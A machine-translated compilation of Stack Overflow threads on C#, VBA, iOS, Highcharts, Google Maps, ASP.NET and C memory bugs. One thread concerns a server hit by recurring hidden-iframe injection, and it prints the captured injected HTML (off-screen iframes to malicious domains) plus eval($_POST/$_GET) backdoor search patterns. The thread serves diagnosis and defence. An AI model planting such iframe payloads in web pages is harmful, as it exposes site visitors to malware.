您需要让课程返回 a `List<IChild>`：

```
public class ParentA : IParent
{ 
    public List<IChild> a { get; set; }
}

public class ParentB : IParent
{ 
    public List<IChild> a { get; set; }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-14T15:34:05.067

该实现只能返回 IChild 列表，如下所示：

```
public interface IChild
{
}

public interface IParent
{
    List<IChild> Children { get; set; }
}

public class ChildA : IChild
{
}

public class ChildB : IChild
{
}

public class ParentA : IParent
{

    public List<IChild> Children
    {
        get;
        set;

    }
}

public class ParentB : IParent
{
    public List<IChild> Children
    {
        get;
        set;
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-14T15:25:41.550

的集合`IChild`不能隐式转换为其子类型的集合

将 的返回类型更改`IParent.a`为`List<ChildA>` **或**将属性声明更改为`ParentA`和。我推荐后者，因为我认为这是你最可能想要的。`ParentB``public List<IChild> a { get; set; }`

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-05-22T07:46:54.363

我有一个类似的要求，我有两种不同的方法，它们对两个不同的类进行操作，但对于两个类共有的属性具有相同的逻辑。

所以我想用继承和泛型为此编写一个通用方法，我能够通过以下方式实现。

```
namespace OOPS.Interfaces
{
    using System.Collections.Generic;

    public interface IBanner
    {
        string Name { get; set; }
    }

    public interface IBannerContent<T> where T : IBanner
    {
        List<T> Banners { get; set; }
    }
} 
```

简单模型。

```
namespace OOPS.Simple
{
    using Interfaces;
    using System.Collections.Generic;

    public class Banner : IBanner
    {
        public string Name { get; set; }
    }

    public class BannerContent : IBannerContent<Banner>
    {
        public List<Banner> Banners { get; set; }
    }
} 
```

复杂模型。

```
namespace OOPS.Complex
{
    using Interfaces;
    using System.Collections.Generic;

    public class Banner : IBanner
    {
        public string Name { get; set; }

        public string Description { get; set; }
    }

    public class BannerContent : IBannerContent<Banner>
    {
        public List<Banner> Banners { get; set; }
    }
} 
```

常见的业务逻辑和示例调用。这里的关键部分是使用`where`子句来限制类型，例如`where T : IBanner`一直到我们希望它通用的方法。

```
namespace OOPS
{
    using Interfaces;
    using System;
    using System.Collections.Generic;

    public class BusinessLogic
    {
        public void Print<T>(IBannerContent<T> bannerContent) where T : IBanner
        {
            foreach (var item in bannerContent.Banners)
            {
                Console.WriteLine(item.Name);
            }
        }
    }

    class Program
    {
        static void Main(string[] args)
        {
            var banner1 = new Simple.BannerContent
            {
                Banners = new List<Simple.Banner>
                {
                    new Simple.Banner { Name = "Banner 1" },
                    new Simple.Banner { Name = "Banner 2" }
                }
            };

            var banner2 = new Complex.BannerContent
            {
                Banners = new List<Complex.Banner>
                {
                    new Complex.Banner { Name = "Banner 3", Description = "Test Banner" },
                    new Complex.Banner { Name = "Banner 4", Description = "Design Banner" }
                }
            };

            var business = new BusinessLogic();
            business.Print(banner1);
            business.Print(banner2);
            Console.ReadLine();
        }
    }
} 
```

# vba - 复制到 Outlook 公用文件夹时，电子邮件属性丢失

> ID：11955616
> 
> 赞同：2
> 
> 时间：2012-08-14T15:22:53.520
> 
> 标签：vba, outlook

我的 VBA 应用程序将选定的、本地存储的电子邮件移动/复制到我拥有完全访问权限的指定公用文件夹。

问题是在移动/复制电子邮件后，To 和 From 属性会变得混乱。那是：

原文来自：GuyA

原收件人：我

搬家后来自：我

after-move To：公用文件夹的名称

我尝试了以下方法，但似乎对公用文件夹中的电子邮件没有任何影响

```
For Each email In a1Bucket.items
    sender = email.SentOnBehalfOfName
    receiver = email.ReceivedOnBehalfOfName
    email.Move largeBucket
    email.SentOnBehalfOfName = sender
    email.To = receiver
Next 
```

我错过了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-14T16:47:07.533

试试这个（**在本地文件夹上测试**）

```
For Each Email In a1Bucket.items
    sender = Email.SentOnBehalfOfName
    receiver = Email.ReceivedOnBehalfOfName
    Set currentMailItem = Email.Move (largeBucket)
    currentMailItem.SentOnBehalfOfName = sender
    currentMailItem.To = receiver
    currentMailItem.Save
Next 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T17:08:02.717

尝试：

```
Dim newEMail As Outlook.MailItem    
For Each email In a1Bucket.items
    sender = email.SentOnBehalfOfName
    receiver = email.ReceivedOnBehalfOfName
    Set newEMail = objmail.Move(largeBucket)
    'email.Move largeBucket
    newEMail.SentOnBehalfOfName = sender
    newEMail.To = receiver
Next 
```

您可能还需要在此之后保存它。您使用上面的代码保留对对象的引用 - 在被移动之后。

以下：

```
email.SentOnBehalfOfName = sender
email.To = receiver 
```

仅修改原始电子邮件（而**不是**移动后的电子邮件）。它不与新的电子邮件/邮件对象相关联。

# objective-c - 如何控制 UITableCell 文本标签的位置？

> ID：11955631
> 
> 赞同：2
> 
> 时间：2012-08-14T15:23:30.167
> 
> 标签：objective-c, ios, uitableview

我将如何放置单元格标签。这是我的 cell.detailTextLabel.text

```
cell.detailTextLabel.text = [[[placesOutputArray objectAtIndex:indexPath.row] childAtIndex:1] stringValue]; 
```

我在想一些事情：

```
detailsLb = [[[UILabel alloc] initWithFrame:CGRectMake(40, 45, 250, 20)] autorelease]; 
```

我坚持以某种方式将两者合并在一起，以便将 cell.detailTextLabel.text 放置在我想要的位置。

谢谢你的帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:33:32.923

我认为 detailTextLabel 框架不可编辑。最简单的方法是使用 xib 文件创建自定义 UITableViewCell。在检查器中选择 Style = "Custom" 并在任何你想要的地方放置一个详细标签。不要忘记在您的自定义类中将相关的 IBOutlet 添加到此标签。

完成后，您可以在 -(UITableViewCell *)tableView:tableView CellForRowAtIndexPath:(NSIndexPath *)indexPath 方法中使用自定义单元格类而不是 UITableViewCell

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T15:26:13.043

您可以尝试以下方法：

*   子类 UITableViewCell
*   覆盖超方法“layoutSubviews”。在那里，您可以简单地设置 detailTextLabel 的“框架”属性。

这应该够了吧。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-14T17:29:36.023

你有两个选择：

1.  子类`UITableViewCell`
2.  您也可以通过向单元格的内容视图添加标签来执行此操作。

喜欢：

```
UILabel *details= [[UILabel alloc] initWithFrame:CGRectMake(10, 45, 100, 20)];
[cell.contentView addSubview:details];
[details release]; 
```

此外，当您重复使用单元格时，您需要删除此标签。所以你也需要考虑这一点。

# security - iFrame 注入攻击跟随我们到新服务器

> ID：11955634
> 
> 赞同：3
> 
> 时间：2012-08-14T15:23:37.610
> 
> 标签：security, iframe, malware, malware-detection

几个月前，隐藏的 iFrame 开始出现在我们专用服务器上每个站点的每个页面上。当我们使用 503 将站点停机进行维护时，iFrame 仍然在停机维护页面上。最终，宿主封锁了 iFrame 的来源，但我们始终没有找到后门。注入的 iFrame 看起来像这样，但包裹在一个样式标签中以进行混淆，并带有各种 URL：

iframe src="http://heusnsy.nl/32283947.html..

我们将较小的站点移到了不同​​的主机上，它们都很好。

我们将主站点移动到同一主机上的新专用服务器上，尽管我们努力锁定服务器 - 防火墙、限制访问、软件更新、检查每个文件 - iFrame 还是返回了。

我们到处寻找它是如何进入的 - 配置文件，htaccess - 但找不到它。

知道隐藏的 iFrame 注入漏洞可能在哪里吗？

编辑：这里有更多细节：运行 Apache 和 PHP 的 Linux 机器。一切的最新版本。注入的代码如下所示：

`<style>.ivx4di91j1 { position:absolute; left:-1418px; top:-1348px} </style> <div class="ivx4di91j1"><iframe src="heusnsy.nl/32283947.html..`

更新：这里有更多信息和我们学到的东西：

主机：Station CentOS Linux 6.3 - x86_64 上的 Linux 2.6.32-279.5.1.el6.x86_64 / Apache 版本 2.2.15 - PHP 5.3.3 (cli)（构建时间：2012 年 7 月 3 日 16:53:21）

1.  服务器本身没有受到损害。

2.  包括 (apache/php) 在内的所有服务都升级到我们系统可用的最新版本。

3.  没有帐户（ftp 或其他）受到损害。

4.  恶意软件在多个受感染站点上同时更改其目标 URL (iframe src=)。（由 unmaskparasites.com 提供）

5.  在更改 src 目标期间，没有执行/运行任何流氓或隐藏进程。

6.  TCPDUMP 在离开端口 80 tcp 时获取了恶意软件的代码，但在接收恶意软件的用户的 GET 请求中没有发现任何奇怪的东西——在相应的 apache 访问日志中也没有发现任何奇怪的东西。

7.  在 iFrame 的 src url 地址切换期间，网站文件或 httpd/php 二进制文件没有以任何方式更改 - 由 md5sum 检查提供。

8.  在更改期间，未在已知端口上为已知服务建立恶意连接。防火墙负责其余的工作。

9.  rkhunter 和 maldet 没有结果。

10.  `"</script>"`恶意软件 iFrame在任何具有此标签的页面上的第一个标签之后被触发并注入，在此服务器上的所有帐户和网站上。

11.  恶意软件被注入到静态页面和没有数据库连接的站点上。`<head> </script></head>`（页面有标签就足够了）

12.  没有安装流氓 apache 模块或 php 模块（不包括 mycript.so）。大多数默认的 apache 模块都被挂起并被注释掉。

13.  恶意软件并非一直存在。它来来去去，有时会关闭几个小时，然后出现几个用户并再次熄灭。使其非常难以追踪。

14.  我们网站上运行的 100% 的 php 代码和大多数 javascript 代码（除了 phpmyadmin 之外）是自定义编码的。唯一不是 Jquery 库。

服务器是高流量机器，在日志中搜索/匹配非常慢。每周访问日志可能会超过 15GB。

情况就是这样……这不再是被盗帐户、被黑文件、流氓脚本的问题。这是迄今为止我们所见过的任何事情，原因隐藏在 apache/php 本身的某个地方。（至少这是我们的想法）。非常感谢任何帮助或想法。

以下是 iFrame 注入的示例：

`<script src="/templates/js/jquery-1.4.2.min.js" type="text/javascript"></script><style>.pw0xxs { position:absolute; left:-1795px; top:-1357px} </   style> <div class="pw0xxs"><iframe src="http://infectedsite.com/84064443.html" width="167" height="332"></iframe></div>`

`<script src="http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js" type="text/javascript"></script><style>.h3fuonj6 { position:absolute; left :-1012px; top:-1348px} </style> <div class="h3fuonj6"><iframe src="http://infectedsite.com/13334443.html" width="236" height="564"></iframe></div >`

`</script><style>.exm31sfk8l { position:absolute; left:-1349px; top:-1836px} </style> <div class="exm31sfk8l"><iframe src="http://infectedsite.com/79144443.html" wid th="559" height="135"></iframe></div> document.write('<style>.exm31sfk8l { position:absolute; left:-1349px; top:-1836px} </style> <div class="exm31sfk8l"><iframe src="http://ksner.pl/79144443.ht ml" width="559" height="135"></iframe></div>');// ColorBox v1.3.19.3 - jQuery lightbox plugin`

`</script><style>.rv9mlj { position:absolute; left:-1698px; top:-1799px} </style> <div class="rv9mlj"><iframe src="http://infectedsite.com/42054443\. html" width="163" height="409"></iframe></div>`

`<script src="./js/cross_framing_protection.js?ts=1344391602" type="text/javascript"></script><style>.rv9mlj { position:absolute; left:-1698px; top:-1799px}  </style> <div class="rv9mlj"><iframe src="http://infectedsite.com/42054443.html" width="163" height="409"></iframe></div>`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T16:07:06.410

检查一下... 劫持您的服务器的程序的恶意作者被称为“Left4Dead”——他的 iframe 注入 doo-hicky 被称为“BlackLeech”。您可以在 Damagelab .org（犯罪论坛！！）上找到这位绅士和他的广告。

每次 root 登录时，恶意软件都会停止所有活动，或者如果您通过 SSH 连接到您的服务器。它还监控系统监控工具：|

## Damagelab .org 广告的屏幕截图：

[http://imgur.com/NRQQl](http://imgur.com/NRQQl)

## 作者的恶意软件广告文本：

[http://pastebin.com/u7AcYSNi](http://pastebin.com/u7AcYSNi)

> > 请注意您的线程如何被列为参考:))
> > 
> > 如果您需要翻译方面的帮助，请联系我！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-11-11T10:22:20.567

几天前，我管理的网站上出现了一些横幅广告事件。我终于可以摆脱它了。[您可以在此处](https://stackoverflow.com/questions/26146242/ad-coupondropdown/26758649?noredirect=1#comment42244417_26758649)查看完整答案。

问题是javascript代码被附加到textareas。可能是浏览器被感染并附加了导致 iframe 加载的不需要的额外代码。

您的情况有所不同，但它可能会有所帮助：如果您使用 WYSIWYG 编辑器在后端处理您的内容，或者其他人正在这样做，则 iframe 有可能是由附加到 textareas 或输入。

一种不同的方法。希望能帮助到你！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-15T16:05:30.663

我将初始感染的来源大致分为两组：（1）您的网站因某些漏洞而受到攻击（如果您使用的是 Wordpress 或 Joomla 等开源引擎，您应该检查当前的漏洞，您可以从漏洞利用开始 - db.com）（2）您网站的 CMS 是使用弱凭据访问的（正如您对问题的评论中已经指出的那样）

再次出现代码表明感染源仍然存在。通常它是一个 PHP 脚本，它接收一个字符串作为参数（可能以 base64 或其他方式编码），使用 eval 解码并执行它。我猜你没有更改域名，所以这个坏人在他的机器上有一些脚本，定期请求他的“backdor”并重新感染你的系统。

你如何找到这个脚本？您的选择：

*   查看访问日志。查找可疑字符串，例如 something.php?e=asSdfdSsafas== 或对不属于您网站的脚本的 POST 请求。

*   使用字符串搜索扫描所有文件，查找 "eval($_POST['" 或 "eval($_GET['" 或只是 "eval"，然后找到不太可能是您的站点引擎的一部分的文件。

希望这对Bests有帮助

# visual-studio - Microsoft Visual Studio 2012 的 Memoryleak 和 Async Targeting Pack？

> ID：11955635
> 
> 赞同：-1
> 
> 时间：2012-08-14T15:23:38.783
> 
> 标签：visual-studio, async-await

如果应用 Async Targeting Pack for Microsoft Visual Studio 2012，想知道开发人员是否还需要关心发布事件处理程序以避免内存泄漏？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-14T15:26:38.360

> 想知道开发人员是否还需要关心释放事件处理程序以避免内存泄漏？

Async Targeting Pack 对事件和事件处理程序没有影响。它只是使用新的 async/await 语法添加了针对 .NET 4 所需的额外功能，这与事件和事件处理完全无关。

# export - Highcharts 自由格式绘图内容未导出

> ID：11955637
> 
> 赞同：2
> 
> 时间：2012-08-14T15:23:41.117
> 
> 标签：export, rendering, highcharts

所以这是我的要求：

1.  渲染图表数据
2.  用户可以指定所有图表标签（x 和 y 轴、页眉、子页眉、页脚、子页脚）
3.  用户可以将图表导出为各种格式
4.  可能支持其他任意内容，如侧边栏

Highcharts 是#1 和#3 的绝佳选择。它甚至涵盖了#2 的大部分内容，但是，它本身并不支持页脚的概念。

最初，我只是将页脚作为呈现的 highchart 对象下方的纯 HTML 元素输出，但在导出 highchart 时，页脚显然不包括在内。

然后我了解到，highcharts 允许通过利用其自己的内部渲染器来自由绘制，这似乎完美地解决了#2 和#4！

[http://www.highcharts.com/ref/#renderer](http://www.highcharts.com/ref/#renderer)

但是，我正在渲染的文本和形状仍然没有导出。我能够轻松地创建一个示例来说明我正在尝试通过 jsfiddle 做什么。

[http://jsfiddle.net/B6s7V/1/](http://jsfiddle.net/B6s7V/1/)

谁能帮我满足这些要求？也许我在 highcharts 中缺少一些标志来让所有东西都导出？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-16T14:41:53.143

我想到了。我没有在 Highcharts.Chart 函数的完整回调中进行自由格式渲染，而是在加载事件中进行。

太奇怪了，移动到我做渲染的地方修复了它。

# c# - 对象列表控件

> ID：11955642
> 
> 赞同：0
> 
> 时间：2012-08-14T15:23:54.463
> 
> 标签：c#, visual-studio-2010

我正在尝试为多个对象创建某种类型的控件列表。该对象用于屏幕上显示的图案，并具有几个不同的属性，例如持续时间、偏移量、下一个图案、图案索引。我希望能够创建一个可迭代的控件列表，这样我就可以轻松地在我的 GUI 中设置每个模式的不同属性。这是我正在创建的表单的粗略草稿。这是我正在创建的表单的链接。

![在此处输入图像描述](../Images/09c024205dd8d86da040428739aa7391.png)

每行都是一个模式的属性集合。我希望能够以某种方式遍历代码中的每一行，并根据用户输入设置每个模式的属性。从我目前所读到的内容来看，我想我想使用一个 ItemsControl 工具并以某种方式将它绑定到 GUI，但我不确定如何做到这一点，或者我是否应该这样做。我现在使用的是一个带有多个Panel的TableLayoutPanel，但是这些工具似乎并没有太多的控制权。我应该如何将每一行的控件组合在一起，然后有效地遍历每一行？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T19:16:09.663

好的，我认为我已经实现了您对 Sport 的期望，我比 WinForms 更了解 WPF，但这是我自己“自学”的解决方案。

我将假设在您的解决方案中执行此操作不会有任何问题。

首先创建一个用户控件。我右键单击我的 WinForm 项目 > 添加 > 用户控件。这是您要添加构成行的内容的地方。所以它应该看起来像这样，我将我的用户控件命名为 RowContent：

![控制](../Images/43b90e5f65a21cd0f05f548c19ae525f.png)

确保你有你的名字你的控件。所以对于复选框，我将其命名为 stprIndex_chkBox、enable_chkBox 等。

现在您需要为使用的每个控件实现所需的功能。所以，你会想要改变你的`stprIndex_chkBox.Text`, 和`enable_chkBox.Checked`for starters 的值。您还将想要访问`Value`您的 numericUpDowns。因此，在 RowContent.cs 中，我根据表单中需要的数据添加了 getter 和 setter。所以这里是访问器的一个片段*（记住你会想要添加更多）*：

```
public partial class RowContent : UserControl
{
    public RowContent()
    {
        InitializeComponent();
    }

    public string SetChkBox1Text
    {
        set { stprIndex_chkBox.Text = value; }
    }

    public bool IsEnabledChecked
    {
        get { return enable_chkBox.Checked; }
    }
} 
```

现在您看到了，这些将允许您访问 RowContent 类之外的变量。让我们继续讨论 TablePanelLayout 控件。

我以与创建 RowContent 相同的方式创建了一个附加用户控件，但这次我将其命名为 ContentCollection。我将`AutoSize`用户控件设置为 true 并将 TableLayoutPanel （名为 tableLayoutPanel1 ）放到它上面。

为了节省时间，我将所有控件动态添加到行中，如下所示：

```
public partial class ContentCollection : UserControl
{
    public ContentCollection()
    {
        InitializeComponent();
        RowContent one = new RowContent();
        RowContent two = new RowContent();
        RowContent three = new RowContent();
        RowContent four = new RowContent();
        RowContent five = new RowContent();
        RowContent six = new RowContent();
        tableLayoutPanel1.Controls.Add(one);
        tableLayoutPanel1.Controls.Add(two);
        tableLayoutPanel1.Controls.Add(three);
        tableLayoutPanel1.Controls.Add(four);
        tableLayoutPanel1.Controls.Add(five);
        tableLayoutPanel1.Controls.Add(six);
        tableLayoutPanel1.SetRow(one, 0);
        tableLayoutPanel1.SetRow(two, 1);
        tableLayoutPanel1.SetRow(three, 2);
        tableLayoutPanel1.SetRow(four, 3);
        tableLayoutPanel1.SetRow(five, 4);
        tableLayoutPanel1.SetRow(six, 5);
    }
} 
```

这给了我：

![在此处输入图像描述](../Images/2413f750515ba022752ff33338fa9b9f.png)

现在在这里你可以看到我们正在动态添加这些东西。我希望您在 WinForm 中使用此用户控件时，可以想象如何“自定义”它。在同一个文件中，您将需要添加更多 Getters/Setters/functions，具体取决于您想要执行的操作，就像其他用户控件一样；所以，`AddAdditionalRow(RowContext rc)`等等。我实际上作弊并将其更改为`tableLayoutPanel`最终`public`使其更快。

所以最后，你有你的 ContentCollection 来保存你的自定义对象，现在你需要将它添加到你的表单中。

转到您的表格，打开您的工具箱并滚动到顶部以查看您的表格！将其拖放到您的主窗体和中提琴上。现在，要遍历 RowContent，这相当容易。由于我将用户控件拖放到窗体上，因此我能够将其命名为 (userControl12) 并立即开始访问控件。查看我如何将复选标记添加到每个其他复选框并动态更改步进索引：

```
public partial class Form1 : Form
{
    static int i = 0;
    public Form1()
    {
        InitializeComponent();
        foreach (RowContent ctrl in userControl11.tableLayoutPanel1.Controls)
        {
            ctrl.SetChkBox1Text = i.ToString();
            if (!ctrl.IsEnabledChecked && i % 2 == 0)
                ctrl.IsEnabledChecked = true;
            i++;
        }
        foreach (RowContent ctrl in userControl12.tableLayoutPanel1.Controls)
        {
            ctrl.SetChkBox1Text = i.ToString();
            i++;
        }
    }
} 
```

![在此处输入图像描述](../Images/4fcfb29a9d58bd2be09eaa10bcdd8795.png)

我并不是说这是最好的设计......因为它不是，但它说明了如何做这样的事情。如果您有任何问题，请告诉我。

# google-maps - Google Maps API V3：KML 加上额外的标记不缩放以适应两者

> ID：11955644
> 
> 赞同：3
> 
> 时间：2012-08-14T15:23:59.087
> 
> 标签：google-maps, google-maps-api-3, kml

我有一个可以在谷歌地图中正常加载的 kml 文件。在同一页面上，我有一个文本框，用户可以在其中输入他们的位置，这将添加一个标记，这也可以。

我遇到的问题是，如果用户输入了 kml 文件范围之外的位置，则地图不会缩放以同时包含 kml 和新标记。

如果我有preserveViewport = false，它将缩放以适合kml。如果为真，它将缩放以适应新标记。

```
$(document).ready(function () {
  var mapOptions = {
    mapTypeId: google.maps.MapTypeId.ROADMAP
  };

  var map = new google.maps.Map(document.getElementById("map_canvas"), mapOptions);
  var ctaLayer = new google.maps.KmlLayer('KMLLOCATION', { preserveViewport: false });
  ctaLayer.setMap(map);

  var marker = new google.maps.Marker({ position: new google.maps.LatLng(LAT, LONG), map: map, title: 'You are here', clickable: false, icon: '/media/youarehere.png' });

  var bounds = new google.maps.LatLngBounds();
  var ll = new google.maps.LatLng(LAT, LONG);
  bounds.extend(ll);
  map.fitBounds(bounds);
}); 
```

# 编辑

感谢 geocodezip 为我指明了正确的方向。这是我更新的有效代码。

```
$(document).ready(function () {
  var mapOptions = {
    mapTypeId: google.maps.MapTypeId.ROADMAP
  };

  var map = new google.maps.Map(document.getElementById("map_canvas"), mapOptions);
  var layer = new google.maps.KmlLayer('KMLLOCATION', { map: map, preserveViewport: true });

  var marker = new google.maps.Marker({ position: new google.maps.LatLng(LAT, LONG), map: map, title: 'You are here', clickable: false, icon: '/media/youarehere.png' });

  google.maps.event.addListener(layer, 'defaultviewport_changed', function() {
    var bounds = layer.getDefaultViewport();
    var ll = new google.maps.LatLng(LAT, LONG);
    bounds.extend(ll);
    map.fitBounds(bounds);
  });
}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-14T15:28:21.737

您需要获取 kml 的边界（[KmlLayer 上的 getDefaultViewport()](https://developers.google.com/maps/documentation/javascript/reference#KmlLayer)），[使用附加标记对其进行扩展，](https://developers.google.com/maps/documentation/javascript/reference#LatLngBounds)然后使用“扩展”边界对象调用 fitBounds （将 preservViewport 设置为 true ，因此地图不会缩放到默认值KmlLayer 的视口）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-18T18:08:22.730

除此之外，如果您包含多个 kml 并想要缩放所有 kml，这对我有用。

```
var bounds = null;
google.maps.event.addListener(layer, 'defaultviewport_changed', function () {
  if (bounds == null)
      bounds = layer.getDefaultViewport();
  else
      bounds.union(layer.getDefaultViewport());

      map.fitBounds(bounds);

}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-09-24T16:48:14.357

经过多次试验和错误，这就是我想出的。您需要包含图表加载器`https://www.gstatic.com/charts/loader.js`和 geoxml3 `https://github.com/geocodezip/geoxml3/blob/master/kmz/geoxml3.js`。该地图查看一个按国家代码排序的融合表，其中包含表示国家边界的几何图形，然后将边界绘制到地图上并放大它们。如果你想添加另一个标记，只需使用`bounds.extend(someLatLngClassInstanceOrLiteral)`

```
google.charts.load('current', {
   'packages': ['table']
});
google.charts.setOnLoadCallback(zoomMap);

function zoomMap(){

    var map = new google.maps.Map(document.querySelectorAll('.single-map-selector')[0], {
        center: new google.maps.LatLng(30, 0),
        zoom: 2,
        mapTypeId: google.maps.MapTypeId.ROADMAP,
        disableDefaultUI: true,
        scrollwheel: false,
        draggable: false,
    });

    var CountriesServed = ['US', 'CA', 'AU'];

    var jointCountriesArray = CountriesServed.map(function(val, index){
        if( index < CountriesServed.length - 1 ){
            return '\'' + val + '\', ';
        }
        else{
            return '\'' + val + '\'';
        }
    });
    jointCountriesArray = jointCountriesArray.join('');

    var world_geometry = new google.maps.FusionTablesLayer({
        query: {
            select: 'geometry',
            from: '1N2LBk4JHwWpOY4d9fobIn27lfnZ5MDy-NoqqRpk',
            where: "ISO_2DIGIT IN (" + jointCountriesArray + ")",
        },
        heatmap: {
            enabled: false
        },
        suppressInfoWindows: true,
        map: map,
        options: {
            styleId: 2,
            templateId: 2
        },
    });

    var queryText = encodeURIComponent("select geometry from 1N2LBk4JHwWpOY4d9fobIn27lfnZ5MDy-NoqqRpk where 'ISO_2DIGIT' in (" + jointCountriesArray + ")");

    var query = new google.visualization.Query('http://www.google.com/fusiontables/gvizdata?tq=' + queryText);

    query.send(handleQuery);

    function handleQuery(response){
        if (!response) {
            console.log('no response');
            return;
        }
        if (response.isError()) {
            console.log('Error in query: ' + response.getMessage() + ' ' + response.getDetailedMessage());
            return;
        } 
        FTresponse = response;

        numRows = FTresponse.getDataTable().getNumberOfRows();

        var coordinates = [];
        var bounds = new google.maps.LatLngBounds();

        for(var i = 0; i < numRows; i++) {

            var kml = FTresponse.getDataTable().getValue(i,0);

            var coordEls = geoXML3.xmlParse(kml).querySelectorAll('coordinates');
            var coordinateString = '';

            for(var j = 0; j < coordEls.length; j++){
                coordinateString += coordEls[j].innerHTML + ' ';
            }

            var unpairedCoordinates = coordinateString.split(',').map(function(val,index, arr){
                if( val == '0.0' ){
                    arr.splice(index,1);
                }
                else{
                    return val.replace('0.0 ', '');
                }
            });
            for(var k = 0; k < unpairedCoordinates.length; k++){
                if( (k == 0 || k % 2 == 0) && k < unpairedCoordinates.length - 2 ){
                    // is even or zero and we're not at the end of the array
                    // in the coordinates element the latlngs are flipped
                    bounds.extend({
                        lat : parseFloat(unpairedCoordinates[k+1]),
                        lng : parseFloat(unpairedCoordinates[k])
                    });
                }
            }

        }

        map.fitBounds(bounds, -300);
        map.setCenter(bounds.getCenter());

        //// uncomment if you want to see the rectangle of the bounds
        // var rect = new google.maps.Rectangle({
        //  strokeColor: '#FFFFFF',
        //  strokeOpacity: 0.8,
        //  strokeWeight: 2,
        //  fillColor: '#FFFFFF',
        //  fillOpacity: 0.35,
        //  map: map,
        //  bounds: bounds
        // });
    }
} 
```

# asp.net - 在 asp.net 中运行一个长脚本

> ID：11955646
> 
> 赞同：0
> 
> 时间：2012-08-14T15:24:01.827
> 
> 标签：asp.net, ftp, scheduled-tasks, feed

我有一个脚本可以生成一些大文件（产品供稿）并将它们上传到不同的 FTP 位置。

该脚本需要每天运行。

什么是首选路线？它目前是一个 aspx 页面，但它不需要用户界面，也不需要在浏览器中运行。

最佳做法是什么？

有没有办法在 asp.net 中运行无形脚本？我不想在服务器上安装任何东西，即使它是我自己的控制台应用程序。

该脚本还使用了一个 dll (BVSoftware.BVC5)，它可能只能在 Web 应用程序中运行。

目前它是一个计划任务，它在服务器上打开 IE 并加载页面，“如果任务运行时间超过 1 小时，则停止任务”在一小时后关闭 IE。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:27:54.290

您可以使用[计划任务](http://support.microsoft.com/kb/308569)、服务，或者，如果您要使用 SQL 脚本，则可以使用 SQL 代理作业。

请参阅此处：[在 .NET 中编写计划的 Windows 服务](https://stackoverflow.com/questions/164286/writing-a-scheduled-windows-service-in-net)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T15:26:56.137

我会简单地创建一个控制台应用程序来完成这项工作并使用 Windows 调度程序来安排每晚的工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-14T15:31:25.533

如果您尝试在网络服务器上执行后台任务，您可以尝试使用[Worker Roles](https://www.google.co.uk/#q=worker+roles+in+asp.net)。

或者BackgroundWorker线程：[http ://code.msdn.microsoft.com/CSASPNETBackgroundWorker-dda8d7b6](http://code.msdn.microsoft.com/CSASPNETBackgroundWorker-dda8d7b6)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-14T15:30:55.877

由于它已经作为 ASPX 页面工作，因此最少的工作就是简单地使用缓存过期来安排调用来运行它。但是请注意不要依赖它，因为如果网站很少使用它可能会停止。在此处查看： [如何安排 C# 代码执行](https://stackoverflow.com/questions/10794534/how-to-schedule-a-c-sharp-code-execution)

# c - 应用程序在释放内存时出现分段错误

> ID：11955647
> 
> 赞同：0
> 
> 时间：2012-08-14T15:24:06.993
> 
> 标签：c, malloc, free

我有这两个文件：

测试.h

```
#ifndef TEST_H
#define TEST_H

typedef struct _vertex_node
{
  double x;
  double y;
  struct _vertex_node *next;
} vertex_node;

static void add_vertex(vertex_node **node, const double x, const double y);
static void dty_vertex(vertex_node **node);

#endif // TEST_H 
```

测试.c

```
#include <stdio.h>
#include <stdlib.h>

#include "test.h"

static void add_vertex(vertex_node **node, const double x, const double y)
{
  if(NULL == (*node))
  {
    (*node) = malloc(sizeof(vertex_node));
    (*node)->x = x;
    (*node)->y = y;
    (*node)->next = NULL;
  }
  else
    add_vertex(&((*node)->next), x, y);
}

static void dty_vertex(vertex_node **node)
{
  if(NULL != (*node)->next)
    dty_vertex(&((*node)->next));

  free(*node);
}

int main(int argc, char **argv)
{
  vertex_node *node;
  vertex_node *iterator;

  add_vertex(&node, 0, 0);
  add_vertex(&node, 1, 0);
  add_vertex(&node, 1, 1);
  add_vertex(&node, 0, 1);

  iterator = node;

  while(NULL != iterator)
  {
    printf("x: %f, y: %f\n", iterator->x, iterator->y);

    iterator = iterator->next;
  }

  dty_vertex(&node);

  return 0;
} 
```

我正在使用`gcc -Wall -ggdb test.c -o test`命令来编译它。

当我尝试运行它时，它在释放内存时给我一个分段错误，这里有什么问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T15:27:26.330

您需要初始化`node`：

```
vertex_node *node = NULL; 
```

如果你不这样初始化，检查：

```
if(NULL == (*node))
  { /* */ } 
```

第一次调用将失败，这部分被执行：

```
add_vertex(&((*node)->next), x, y); 
```

中的任意值`node`。此时您可能会遇到 seg-fault，或者当您尝试释放节点时（如果您不走运）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-14T15:27:29.263

堆栈上的变量不是零初始化的。尝试以下操作：

```
vertex_node *node = NULL; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-14T15:29:24.877

顶点节点应显式设置为 NULL。您得到的错误可能是由于释放了非分配内存。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-14T15:29:06.483

您正在释放非堆内存。函数退出时释放堆栈内存。

* * *

